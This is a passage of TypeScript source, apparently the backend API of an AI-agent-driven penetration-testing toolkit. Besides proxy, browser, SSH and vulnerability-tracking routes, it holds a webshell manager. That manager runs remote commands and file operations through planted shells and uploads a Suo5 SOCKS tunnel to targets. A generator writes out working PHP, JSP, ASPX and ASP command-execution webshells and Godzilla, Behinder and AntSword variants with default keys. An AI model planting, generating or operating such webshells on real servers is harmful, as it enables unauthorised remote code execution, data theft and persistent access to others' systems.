          const body = JSON.parse(await this.readBody(req)) as { text: string; sessionId?: string }
          if (!body.text) throw new Error('text 缺失')
          const sid = body.sessionId || this.chatSessionId || `pentbox-chat-${Date.now()}`
          if (body.sessionId) this.chatSessionId = sid
          await this.ensureBridge()
          if (!this.bridgeReady) throw new Error('Agent Bridge 未就绪')
          const r = await this.bridge.steer(sid, body.text, 'hermespentbox')
          this.json(res, 200, r)
          break
        }
        case '/api/chat/status': {
          const body = JSON.parse(await this.readBody(req)) as { sessionId?: string }
          const sid = body.sessionId || this.chatSessionId
          await this.ensureBridge()
          if (!sid || !this.bridgeReady) { this.json(res, 200, { exists: false, running: false }); break }
          this.json(res, 200, await this.bridge.status(sid, 'hermespentbox'))
          break
        }
        case '/api/chat/interrupt': {
          const body = JSON.parse(await this.readBody(req)) as { sessionId?: string; message?: string }
          const sid = body.sessionId || this.chatSessionId
          await this.ensureBridge()
          if (sid && this.bridgeReady) await this.bridge.interrupt(sid, body.message, 'hermespentbox').catch(() => {})
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/browser/launch': {
          const body = JSON.parse(await this.readBody(req)) as { engine?: 'chrome' | 'firefox'; proxyPort?: number; customProxy?: string; headless?: boolean; port?: number }
          const engine = body.engine ?? 'chrome'
          const lopts = { proxyPort: body.proxyPort, customProxy: body.customProxy, headless: body.headless, url: body.url }
          if (engine === 'chrome') {
            if (!this.deps.chrome) throw new Error('chrome not wired')
            await this.deps.chrome.launch({ ...lopts, port: body.port })
          } else {
            if (!this.deps.firefox) throw new Error('firefox not wired')
            await this.deps.firefox.launch(lopts)
          }
          // 类 Burp：不忽略证书错误，HTTPS 抓包要求浏览器信任 pentbox CA（未安装则提示，安装后浏览器重试即可）
          const { isCaTrusted } = await import('../core/mitm.ts')
          const caTrusted = isCaTrusted()
          this.json(res, 200, { ok: true, engine, warning: caTrusted ? undefined : 'pentbox CA 未安装到系统证书库：HTTPS 站点将提示证书错误。请到 设置→网络配置→一键安装 CA，然后重试访问。' })
          break
        }
        case '/api/browser/navigate': {
          const body = JSON.parse(await this.readBody(req)) as { url: string; engine?: string }
          // 按 engine 或当前运行中的浏览器选（chrome 对象恒存在但可能未启动，不能直接 ??）
          const b = body.engine === 'firefox'
            ? (this.deps.firefox?.isRunning() ? this.deps.firefox : null)
            : body.engine === 'chrome'
              ? (this.deps.chrome?.isRunning() ? this.deps.chrome : null)
              : ((this.deps.chrome?.isRunning() ? this.deps.chrome : null) ?? (this.deps.firefox?.isRunning() ? this.deps.firefox : null))
          if (!b) throw new Error('browser not launched')
          await b.navigate(body.url)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/browser/eval': {
          const body = JSON.parse(await this.readBody(req)) as { expression: string }
          const b = this.deps.chrome ?? this.deps.firefox
          if (!b) throw new Error('browser not launched')
          this.json(res, 200, { result: await b.evaluate(body.expression) })
          break
        }
        case '/api/browser/stop': {
          await this.deps.chrome?.stop()
          await this.deps.firefox?.stop()
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- SSH ----------------
        case '/api/ssh/connect': {
          if (!this.deps.ssh) throw new Error('ssh not wired')
          const body = JSON.parse(await this.readBody(req)) as { host: string; port?: number; username: string; password?: string }
          await this.deps.ssh.connect(body)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/ssh/exec': {
          if (!this.deps.ssh || !this.deps.ssh.isConnected()) throw new Error('ssh not connected')
          const body = JSON.parse(await this.readBody(req)) as { command: string }
          this.json(res, 200, await this.deps.ssh.exec(body.command, { timeout: 30000 }))
          break
        }
        case '/api/ssh/close': {
          this.deps.ssh?.close()
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- Hermes 对接 ----------------
        case '/api/hermes/test': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          if (!gw) throw new Error('gateway URL 为空')
          const headers: Record<string, string> = body.token ? { authorization: `Bearer ${body.token}` } : {}
          const health = await fetch(`${gw}/v1/health`, { headers, signal: AbortSignal.timeout(5000) })
            .then((r) => r.json())
            .catch((e) => { throw new Error(`health 失败: ${e.message}`) })
          let models: string[] = []
          let current = ''
          // 真实模型清单（/v1/models 只返回 hermes-agent 虚拟别名；/api/model/options 是官方真实清单）
          try {
            const mr = await fetch(`${gw}/api/model/options?refresh=false`, { headers, signal: AbortSignal.timeout(8000) })
            if (mr.ok) {
              const mj = await mr.json()
              const providers = Array.isArray(mj.providers) ? mj.providers : []
              current = providers.find((p: any) => p.is_current)?.models?.[0] ?? ''
              // 排除虚拟聚合 provider（moa 的 "default" 非真实 LLM）
              models = providers.filter((p: any) => p.source !== 'virtual' && Array.isArray(p.models) && p.models.length).flatMap((p: any) => p.models)
            }
          } catch { /* models 端点可选 */ }
          this.json(res, 200, { ok: true, health, models: [...new Set(models)], current })
          break
        }
        case '/api/hermes/run': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string; model?: string; reasoning?: string; input: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          if (!gw || !body.input) throw new Error('gateway 或 input 为空')
          const headers: Record<string, string> = {
            'content-type': 'application/json',
            ...(body.token ? { authorization: `Bearer ${body.token}` } : {}),
          }
          // 思考深度映射：参考 hermes parse_reasoning_effort + deepseek build_api_kwargs_extras，
          // 传输格式参考 hermes-studio：gateway 兼容标量 model_options.reasoning_effort（api_server.py:208）
          // none→对象形式显式关闭；low/medium/high/xhigh→标量；空→默认（不传）
          const payload: Record<string, unknown> = { input: body.input }
          if (body.model) payload.model = body.model
          const rc = parseReasoningEffort(body.reasoning)
          if (rc) {
            payload.model_options = rc.enabled
              ? { reasoning_effort: rc.effort }
              : { reasoning: { enabled: false } }
          }
          const r = await fetch(`${gw}/v1/runs`, { method: 'POST', headers, body: JSON.stringify(payload), signal: AbortSignal.timeout(15000) })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error ?? j.detail ?? `HTTP ${r.status}`)
          this.json(res, 200, j)
          break
        }
        case '/api/hermes/run/events': {
          // SSE 流式转发：renderer 端 fetch 本端点即可拿到 gateway 事件流
          const gw = (url.searchParams.get('gateway') ?? '').replace(/\/+$/, '')
          const id = url.searchParams.get('id') ?? ''
          const token = url.searchParams.get('token') ?? ''
          if (!gw || !id) { this.json(res, 400, { error: 'gateway/id 缺失' }); break }
          const headers: Record<string, string> = token ? { authorization: `Bearer ${token}` } : {}
          const up = await fetch(`${gw}/v1/runs/${id}/events`, { headers, signal: AbortSignal.timeout(600000) })
          if (!up.ok || !up.body) { this.json(res, 502, { error: `gateway events HTTP ${up.status}` }); break }
          res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive', ...CORS })
          const reader = up.body.getReader()
          try {
            for (;;) {
              const { done, value } = await reader.read()
              if (done) break
              res.write(Buffer.from(value))
            }
          } catch {
            // 客户端断开等：直接结束
          } finally {
            reader.releaseLock()
            res.end()
          }
          break
        }
        case '/api/hermes/run/stop': {
          const body = JSON.parse(await this.readBody(req)) as { gateway?: string; token?: string; id: string }
          const gw = (body.gateway ?? '').replace(/\/+$/, '')
          const headers: Record<string, string> = body.token ? { authorization: `Bearer ${body.token}` } : {}
          await fetch(`${gw}/v1/runs/${body.id}/stop`, { method: 'POST', headers, signal: AbortSignal.timeout(5000) }).catch(() => {})
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- Hermes 运行时模型覆盖（纯 HTTP，无 SSH） ----------------
        // gateway 无 config 写 API；改"当前对接的 LLM"用官方运行时机制：/v1/runs 的 model 参数
        // ---------------- Hermes 已对接的 LLM 模型列表（gateway 官方真实清单 /api/model/options） ----------------
        // /v1/models 只返回虚拟别名（hermes-agent）；真实模型在 /api/model/options（api_server 源码注释：供外部客户端同步 provider 目录）
        case '/api/hermes/models': {
          const gw = (url.searchParams.get('gateway') ?? '').replace(/\/+$/, '')
          const token = url.searchParams.get('token') ?? ''
          if (!gw) { this.json(res, 400, { error: 'gateway 缺失' }); break }
          const headers: Record<string, string> = token ? { authorization: `Bearer ${token}` } : {}
          const mr = await fetch(`${gw}/api/model/options?refresh=false`, { headers, signal: AbortSignal.timeout(8000) })
          if (!mr.ok) { this.json(res, 502, { error: `HTTP ${mr.status}` }); break }
          const mj = await mr.json()
          const providers = Array.isArray(mj.providers) ? mj.providers : []
          const current = providers.find((p: any) => p.is_current)?.models ?? []
          // 排除虚拟聚合 provider（moa 的 "default" 非真实 LLM）
          const available = providers.filter((p: any) => p.source !== 'virtual' && Array.isArray(p.models) && p.models.length).flatMap((p: any) => p.models)
          this.json(res, 200, { models: [...new Set([...current, ...available])], current: current[0] ?? '' })
          break
        }
        // ---------------- Repeater（重发器） ----------------
        case '/api/repeater/send': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          try {
            const body = JSON.parse(await this.readBody(req)) as { raw: string }
            const r = await this.repeaterSend(body.raw ?? '')
            this.json(res, 200, { ok: true, ...r })
          } catch (e) {
            this.json(res, 400, { ok: false, error: (e as Error).message })
          }
          break
        }
        // WebSocket 单发（兼容旧端点；协议自动识别已并入 /api/repeater/send）
        case '/api/repeater/ws/send': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          try {
            const body = JSON.parse(await this.readBody(req)) as { url: string; payload: string }
            const msg = await this.wsSendOnce(body.url ?? '', body.payload ?? '')
            this.json(res, 200, { ok: true, message: msg })
          } catch (e) {
            this.json(res, 400, { ok: false, error: (e as Error).message })
          }
          break
        }
        // ---------------- Agent 分析队列（消息队列：流量逐个入队，Agent 消费并写回） ----------------
        case '/api/analyze/status': {
          const out: Record<string, unknown> = {}
          for (const [id, s] of this.analyzeMap) out[id] = s
          this.json(res, 200, { items: out })
          break
        }
        case '/api/analyze/next': {
          while (this.analyzeQueue.length) {
            const id = this.analyzeQueue.shift()!
            const st = this.analyzeMap.get(id)
            if (!st || st.state === 'done') continue
            st.state = 'analyzing'
            this.json(res, 200, { flowId: id, detail: st.detail ?? null })
            return
          }
          this.json(res, 200, { flowId: null })
          break
        }
        case '/api/analyze/result': {
          if (req.method !== 'POST') { this.json(res, 405, { error: 'POST only' }); break }
          const b = JSON.parse(await this.readBody(req)) as { flowId: number; vuln: boolean; level?: string }
          const st = this.analyzeMap.get(b.flowId)
          if (st) { st.state = 'done'; st.vuln = !!b.vuln; st.level = b.level ?? 'info' }
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- 漏洞库（Agent 增删改查） ----------------
        case '/api/vulns': {
          if (req.method === 'GET') {
            this.json(res, 200, { items: this.vulns.map(({ reqRaw, resRaw, ...meta }) => meta) })
          } else if (req.method === 'POST') {
            const b = JSON.parse(await this.readBody(req)) as Partial<Vuln>
            const v: Vuln = { id: ++this.vulnSeq, name: b.name ?? '未命名漏洞', level: (['high', 'medium', 'low', 'info'].includes(b.level as string) ? b.level : 'info') as Vuln['level'], cvss: b.cvss ?? '', uri: b.uri ?? '', desc: b.desc ?? '', exploit: b.exploit ?? '', status: (b.status === 'confirmed' || b.status === 'false') ? b.status : 'pending', reqRaw: b.reqRaw ?? '', resRaw: b.resRaw ?? '', ts: Date.now() }
            this.vulns.push(v)
            this.saveVulns()
            // 漏洞入图（Agent 共享）
            const { host, path } = this.splitVulnUri(v.uri)
            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.broadcastGraphChange(`新漏洞(${v.level}) ${host}${path}: ${v.name}`) }
            this.json(res, 200, { ok: true, id: v.id })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        case '/api/vulns/detail': {
          const id = Number(url.searchParams.get('id')) || 0
          const v = this.vulns.find((x) => x.id === id)
          if (!v) { this.json(res, 404, { error: 'not found' }); break }
          if (req.method === 'GET') this.json(res, 200, v)
          else if (req.method === 'PUT') {
            const b = JSON.parse(await this.readBody(req)) as Partial<Vuln>
            if (b.name !== undefined) v.name = b.name
            if (b.level !== undefined && ['high', 'medium', 'low', 'info'].includes(b.level)) v.level = b.level as Vuln['level']
            if (b.cvss !== undefined) v.cvss = b.cvss
            if (b.uri !== undefined) v.uri = b.uri
            if (b.desc !== undefined) v.desc = b.desc
            if (b.exploit !== undefined) v.exploit = b.exploit
            if (b.status === 'confirmed' || b.status === 'pending' || b.status === 'false') v.status = b.status
            if (b.reqRaw !== undefined) v.reqRaw = b.reqRaw
            if (b.resRaw !== undefined) v.resRaw = b.resRaw
            this.saveVulns()
            // 漏洞更新同步入图
            const { host, path } = this.splitVulnUri(v.uri)
            if (host && path) { this.graph.writeVuln({ name: v.name, level: v.level, desc: v.desc, host, path, exploit: v.exploit, color: HAE_LEVEL_COLOR[v.level] }); this.broadcastGraphChange(`漏洞更新(${v.level}) ${host}${path}: ${v.name}`) }
            this.json(res, 200, { ok: true })
          } else if (req.method === 'DELETE') {
            const vd = this.vulns.find((x) => x.id === id)
            this.vulns = this.vulns.filter((x) => x.id !== id)
            this.saveVulns()
            // 漏洞从图移除
            if (vd) {
              const { host, path } = this.splitVulnUri(vd.uri)
              if (host && path) this.graph.removeVuln(host, path, vd.name)
            }
            this.json(res, 200, { ok: true })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        // ---------------- WebShell 管理（CRUD + 命令执行 + 存活探测；经内置代理发出，流量进流量面板） ----------------
        case '/api/webshells': {
          if (req.method === 'GET') {
            this.json(res, 200, { items: this.webshells.map(({ password, key, ...meta }) => ({ ...meta, password: password ? '***' : '', key: key ? '***' : '' })) })
          } else if (req.method === 'POST') {
            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
            if (!b.url) throw new Error('url 缺失')
            const w = { id: ++this.wsSeq, type: b.type || 'custom', script: b.script || 'php', url: b.url, password: b.password || '', key: b.key || '', status: 'unknown', ts: Date.now(), cryption: b.cryption || '', payload: b.payload || '', encoding: b.encoding || 'UTF-8', headers: b.headers || '', reqLeft: b.reqLeft || '', reqRight: b.reqRight || '', connTimeout: b.connTimeout || 3000, readTimeout: b.readTimeout || 60000, remark: b.remark || '' }
            this.webshells.push(w)
            this.saveWebshells()
            // WebShell 入图（Agent 共享连接方式）
            this.graph.writeWebShell(w)
            this.broadcastGraphChange(`新 WebShell(${w.type}/${w.script}) ${w.url}`)
            this.json(res, 200, { ok: true, id: w.id })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        case '/api/webshells/detail': {
          const id = Number(url.searchParams.get('id')) || 0
          const w = this.webshells.find((x) => x.id === id)
          if (!w) { this.json(res, 404, { error: 'not found' }); break }
          if (req.method === 'GET') this.json(res, 200, w)
          else if (req.method === 'PUT') {
            const b = JSON.parse(await this.readBody(req)) as Partial<{ type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; reqLeft: string; reqRight: string; connTimeout: number; readTimeout: number; remark: string }>
            if (b.type !== undefined) w.type = b.type
            if (b.script !== undefined) w.script = b.script
            if (b.url !== undefined) w.url = b.url
            if (b.password !== undefined) w.password = b.password
            if (b.key !== undefined) w.key = b.key
            if (b.cryption !== undefined) w.cryption = b.cryption
            if (b.payload !== undefined) w.payload = b.payload
            if (b.encoding !== undefined) w.encoding = b.encoding
            if (b.headers !== undefined) w.headers = b.headers
            if (b.connTimeout !== undefined) w.connTimeout = b.connTimeout
            if (b.readTimeout !== undefined) w.readTimeout = b.readTimeout
            if (b.remark !== undefined) w.remark = b.remark
            if (b.reqLeft !== undefined) w.reqLeft = b.reqLeft
            if (b.reqRight !== undefined) w.reqRight = b.reqRight
            if (b.timeout !== undefined) w.timeout = b.timeout
            this.saveWebshells()
            // 更新同步入图
            this.graph.writeWebShell(w)
            this.broadcastGraphChange(`WebShell 更新(${w.type}/${w.script}) ${w.url}`)
            this.json(res, 200, { ok: true })
          } else if (req.method === 'DELETE') {
            const wd = this.webshells.find((x) => x.id === id)
            this.webshells = this.webshells.filter((x) => x.id !== id)
            this.saveWebshells()
            // 从图移除
            if (wd) this.graph.deleteWebShell(wd.url)
            this.json(res, 200, { ok: true })
          } else { this.json(res, 405, { error: 'method not allowed' }) }
          break
        }
        case '/api/webshells/ping': {
          const b = JSON.parse(await this.readBody(req)) as { id: number }
          const w = this.webshells.find((x) => x.id === b.id)
          if (!w) throw new Error('webshell 不存在')
          try {
            const r = await this.wsRequest(w, 'GET', w.url, undefined)
            w.status = r.code >= 200 && r.code < 400 ? 'alive' : 'dead'
            this.saveWebshells()
            this.json(res, 200, { alive: w.status === 'alive', code: r.code })
          } catch (e) {
            w.status = 'dead'
            this.saveWebshells()
            this.json(res, 200, { alive: false, error: (e as Error).message })
          }
          break
        }
        case '/api/webshells/alive': {
          const b = JSON.parse(await this.readBody(req)) as { id: number }
          const w = this.webshells.find((x) => x.id === b.id)
          if (!w) throw new Error('webshell 不存在')
          const r = await this.wsAliveShell(w)
          w.status = r.alive ? 'alive' : 'dead'
          this.saveWebshells()
          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
          break
        }
        case '/api/webshells/alive_all': {
          // 测试所有 WebShell 连接（逐个存活校验），更新各自 status，返回汇总
          const results: { id: number; url: string; type: string; script: string; alive: boolean; detail: string; error: string }[] = []
          for (const w of this.webshells) {
            const r = await this.wsAliveShell(w)
            w.status = r.alive ? 'alive' : 'dead'
            results.push({ id: w.id, url: w.url, type: w.type, script: w.script, alive: r.alive, detail: r.detail || '', error: r.error || '' })
          }
          this.saveWebshells()
          this.json(res, 200, { results })
          break
        }
        case '/api/webshells/fileop': {
          // 文件操作（哥斯拉调 payload 方法）：action=list(列目录)/delete/read/write
          const b = JSON.parse(await this.readBody(req)) as { id: number; action: string; dir?: string; file?: string; content?: string }
          const w = this.webshells.find((x) => x.id === b.id)
          if (!w) throw new Error('webshell 不存在')
          let pms: Record<string, string | Buffer>
          if (b.action === 'list') pms = { methodName: 'getFile', dirName: b.dir || '/' }
          else if (b.action === 'delete') pms = { methodName: 'deleteFile', fileName: b.file || '' }
          else if (b.action === 'read') pms = { methodName: w.script === 'php' ? 'readFileContent' : 'readFile', fileName: b.file || '' }
          else if (b.action === 'write') pms = { methodName: 'uploadFile', fileName: b.file || '', fileValue: Buffer.from(b.content || '', 'base64') }
          else throw new Error('未知操作')
          const buf = await this.wsFileOp(w, pms)
          // 读取返回 base64（二进制安全）；其他返回文本
          if (b.action === 'read') this.json(res, 200, { output: buf.toString('base64') })
          else this.json(res, 200, { output: buf.toString(w.encoding || 'utf8') })
          break
        }
        case '/api/webshells/suo5': {
          // Suo5 正向代理：部署服务端到目标 + 启动本地 SOCKS5 隧道
          const b = JSON.parse(await this.readBody(req)) as { action: 'start' | 'stop' | 'status'; id?: number; type?: string; url?: string; port?: number; dir?: string; name?: string }
          if (b.action === 'status') {
            this.json(res, 200, { running: !!this.suo5Proc, port: this.suo5Proc?.port || 0, url: this.suo5Proc?.url || '' })
            break
          }
          if (b.action === 'stop') {
            if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } this.suo5Proc = null }
            this.json(res, 200, { ok: true })
            break
          }
          // start
          const w = this.webshells.find((x) => x.id === b.id)
          if (!w) throw new Error('webshell 不存在')
          if (!b.url) throw new Error('目标 URL 缺失')
          // 类型按 Webshell 脚本自动判断（未显式指定时）
          const autoType = w.script === 'jsp' || w.script === 'jspx' ? 'jsp' : (w.script === 'aspx' || w.script === 'asp') ? 'aspx' : 'php'
          const ext = b.type === 'jsp' ? 'jsp' : b.type === 'aspx' ? 'aspx' : (b.type || autoType) === 'jsp' ? 'jsp' : (b.type || autoType) === 'aspx' ? 'aspx' : 'php'
          const fn = (b.name || 'suo5').replace(/[\\/]/g, '') + '.' + ext
          const scriptPath = join(process.cwd(), 'tools', 'suo5', fn)
          if (!existsSync(scriptPath)) throw new Error('服务端脚本缺失: ' + scriptPath)
          const script = readFileSync(scriptPath)
          const dir = (b.dir || '/tmp').replace(/\/+$/, '')
          const target = dir + '/' + fn
          // 部署服务端到目标
          if (w.type === 'godzilla') {
            await this.wsFileOp(w, { methodName: 'uploadFile', fileName: target, fileValue: script })
          } else {
            const b64 = script.toString('base64')
            await this.wsExecShell(w, `echo ${b64} | base64 -d > ${JSON.stringify(target)}`)
          }
          // 启动本地隧道（直连目标；若目标需经代理，可自行配置 suo5 --proxy）
          const port = b.port || 1080
          const suo5Dir = join(process.cwd(), 'tools', 'suo5')
          const suo5Bin = join(suo5Dir, 'suo5.exe')
          if (this.suo5Proc) { try { this.suo5Proc.proc.kill() } catch { /* */ } }
          this.suo5Proc = { proc: spawn(suo5Bin, ['-t', b.url, '-l', '127.0.0.1:' + port], { detached: true, cwd: suo5Dir, stdio: 'ignore' }), port, url: b.url }
          this.json(res, 200, { ok: true, path: target, port })
          break
        }
        case '/api/webshells/test': {
          // 添加弹窗"测试连接"：用临时参数走存活校验（不保存）
          const b = JSON.parse(await this.readBody(req)) as { type: string; script: string; url: string; password: string; key: string; cryption: string; payload: string; encoding: string; headers: string; readTimeout: number }
          if (!b.url) throw new Error('url 缺失')
          // 测试前清除该 URL 的会话 cookie（避免复用之前失败/污染/其他配置的 session，保证握手干净）
          this.wsCookies.delete(b.url)
          const w = {
            id: 0, type: (b.type || 'custom').toLowerCase(), script: (b.script || 'php').toLowerCase(),
            url: b.url, password: b.password || '', key: b.key || '', cryption: b.cryption || '', payload: b.payload || '',
            encoding: b.encoding || 'UTF-8', headers: b.headers || '', readTimeout: b.readTimeout || 60000,
          }
          const r = await this.wsAliveShell(w)
          this.json(res, 200, { alive: r.alive, detail: r.detail || '', error: r.error || '' })
          break
        }
        case '/api/webshells/exec': {
          const b = JSON.parse(await this.readBody(req)) as { id: number; command: string }
          const w = this.webshells.find((x) => x.id === b.id)
          if (!w) throw new Error('webshell 不存在')
          if (!b.command) throw new Error('command 缺失')
          try {
            const out = await this.wsExecShell(w, b.command)
            this.json(res, 200, { ok: true, output: out })
          } catch (e) {
            this.json(res, 200, { ok: false, error: (e as Error).message })
          }
          break
        }
        // ---------------- WebShell 生成（参考各工具原版：哥斯拉=Payload+加密；冰蝎=AES密钥模板；蚁剑=一句话；自定义=脚本） ----------------
        case '/api/webshells/generate': {
          const b = JSON.parse(await this.readBody(req)) as { type: string; payload: string; script: string; cryption: string; password: string; key: string }
          const type = (b.type || 'godzilla').toLowerCase()
          const pass = (b.password || 'pass').trim()
          const key = (b.key || '3c6e0b8a9c15224a').trim()
          const payload = b.payload || 'PhpDynamicPayload'
          const script = (b.script || 'php').toLowerCase()
          const cryption = (b.cryption || '').toLowerCase()
          const md5Key = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
          const md5Pass = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
          const isRaw = cryption.includes('raw')
          const isEval = cryption.includes('eval')
          // 读取模板
          const readT = (dir: string, name: string): string => {
            const p = join(process.cwd(), 'assets', 'payloads', dir, name)
            return existsSync(p) ? readFileSync(p, 'utf8') : ''
          }
          const toUnicode = (s: string): string => {
            let out = ''
            for (const ch of s) out += '\\u' + ch.charCodeAt(0).toString(16).padStart(4, '0')
            return out
          }
          let code = ''
          let mode = ''
          let outScript = script
          // ================= 哥斯拉（Payload 决定脚本+加密） =================
          if (type === 'godzilla') {
            const metaOf = (p: string) => p === 'PhpDynamicPayload' ? 'php' : p === 'JavaDynamicPayload' ? 'jsp' : p === 'CShapDynamicPayload' ? 'aspx' : p === 'AspDynamicPayload' ? 'asp' : ''
            outScript = metaOf(payload)
            if (!outScript) throw new Error(`未知 payload: ${payload}`)
            if (outScript === 'php') {
              const tmplName = isRaw ? 'raw.bin' : isEval ? 'eval.bin' : 'base64.bin'
              let tmpl = readT('php', tmplName)
              if (!tmpl) throw new Error('PHP 模板缺失')
              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
              mode = isRaw ? 'XOR RAW' : isEval ? 'EVAL XOR BASE64' : 'XOR BASE64'
            } else if (outScript === 'jsp') {
              // 原版 JavaAes：raw/base64 模板 + shell.jsp，明文替换（与原版 GUI 完全一致，无 unicode 转义）
              const gTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'GlobalCode.bin')
              const cTmpl = readT('java', (isRaw ? 'raw' : 'base64') + 'Code.bin')
              const shellTmpl = readT('java', 'shell.jsp')
              if (!gTmpl || !cTmpl || !shellTmpl) throw new Error('JSP 模板缺失')
              const globalCode = gTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
              code = shellTmpl.replace(/\{globalCode\}/g, globalCode).replace(/\{code\}/g, codePart)
              mode = isRaw ? 'JAVA AES RAW' : 'JAVA AES BASE64'
            } else if (outScript === 'aspx') {
              const cTmpl = isRaw ? readT('cshap', 'raw.bin') : readT('cshap', 'base64.bin')
              const shellTmpl = readT('cshap', 'shell.aspx')
              if (!cTmpl || !shellTmpl) throw new Error('ASPX 模板缺失')
              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
              code = shellTmpl.replace(/\{code\}/g, codePart)
              mode = isRaw ? 'CSHAP AES RAW' : 'CSHAP AES BASE64'
            } else if (outScript === 'asp') {
              let tmpl = ''
              if (isEval) tmpl = readT('asp', 'AspEvalBase64.bin')
              else if (isRaw) tmpl = readT('asp', 'AspXorRaw.bin')
              else tmpl = readT('asp', 'AspXorBae64.bin')
              if (!tmpl) throw new Error('ASP 模板缺失')
              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key)
              mode = isRaw ? 'ASP XOR RAW' : isEval ? 'ASP EVAL BASE64' : 'ASP XOR BASE64'
            }
          }
          // ================= 冰蝎（AES 密钥=md5密码前16，服务端模板替换 key） =================
          else if (type === 'behinder') {
            outScript = script
            const isXor = cryption.includes('xor')
            if (isXor && script !== 'php') throw new Error('冰蝎 XOR 加密仅支持 PHP')
            const tmplMap: Record<string, string> = {
              php: isXor ? 'shell_xor.php' : 'shell.php', jsp: 'shell_java9.jsp', jspx: 'shell_uni.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
            }
            const fname = tmplMap[script]
            if (!fname) throw new Error(`冰蝎暂不支持脚本 ${script}`)
            const tmpl = readT('behinder', fname)
            if (!tmpl) throw new Error(`冰蝎模板缺失: ${fname}`)
            // 冰蝎服务端 key = md5(密码)前16（模板默认 e45e329feb5d925b=md5('rebeyond')）
            code = tmpl.replace(/e45e329feb5d925b/g, md5Pass)
            mode = isXor ? `XOR（密钥=md5(密码)前16=${md5Pass}）` : `AES（密钥=md5(密码)前16=${md5Pass}）`
          }
          // ================= 蚁剑（一句话木马，密码为连接参数） =================
          else if (type === 'antsword') {
            outScript = script
            const tmplMap: Record<string, string> = {
              php: 'shell.php', jsp: 'shell.jsp', aspx: 'shell.aspx', asp: 'shell.asp',
            }
            const fname = tmplMap[script]
            if (!fname) throw new Error(`蚁剑暂不支持脚本 ${script}`)
            const tmpl = readT('antsword', fname)
            if (!tmpl) throw new Error(`蚁剑模板缺失: ${fname}`)
            // PHP 模板在 PHP8 下字符串函数名失效 → 用标准一句话（连接协议兼容：?id + shell=base64）
            if (script === 'php') {
              code = `<?php @eval(base64_decode($_POST["shell"]));?>`
            } else {
              code = tmpl
            }
            mode = `一句话木马 · 密码 ${pass}`
          }
          // ================= 自定义（基础一句话，GET ?pwd=<pass>&cmd= 参数，密码参与校验） =================
          else if (type === 'custom') {
            outScript = script
            if (script === 'php') code = `<?php if(@$_GET["pwd"]=="${pass}")@system($_GET["cmd"]);?>`
            else if (script === 'jsp') code = `<%if("${pass}".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}}%>`
            else if (script === 'aspx') code = `<%@ Page Language="C#"%><%try{if(Request["pwd"]=="${pass}"){System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}}catch{}%>`
            else if (script === 'asp') code = `<%if request("pwd")="${pass}" then execute request("cmd")%>`
            else throw new Error(`自定义暂不支持脚本 ${script}`)
            mode = '自定义 · GET pwd+cmd 认证'
          } else {
            throw new Error(`未知类型: ${type}`)
          }
          this.json(res, 200, { ok: true, code, script: outScript, payload, note: `${type === 'godzilla' ? payload + ' · ' : ''}${mode}` })
          break
        }
        // ---------------- Intercept（请求拦截） ----------------
        case '/api/intercept/state': {
          if (req.method === 'PUT') {
            const body = JSON.parse(await this.readBody(req)) as { enabled: boolean }
            this.engine.setInterceptEnabled(!!body.enabled)
          }
          this.json(res, 200, { enabled: this.engine.interceptEnabled, queue: this.engine.interceptQueue.map((i) => ({ id: i.id, kind: i.kind, method: i.method, url: i.url, ts: i.ts })) })
          break
        }
        case '/api/intercept/forward': {
          const body = JSON.parse(await this.readBody(req)) as { id: number }
          this.json(res, 200, { ok: this.engine.forwardIntercepted(body.id) })
          break
        }
        case '/api/intercept/drop': {
          const body = JSON.parse(await this.readBody(req)) as { id: number }
          this.json(res, 200, { ok: this.engine.dropIntercepted(body.id) })
          break
        }
        // ---------------- WebSockets History（CDP 捕获的 WS 帧） ----------------
        case '/api/wsflows': {
          this.json(res, 200, { items: this.wsFlows.slice(-200).reverse() })
          break
        }
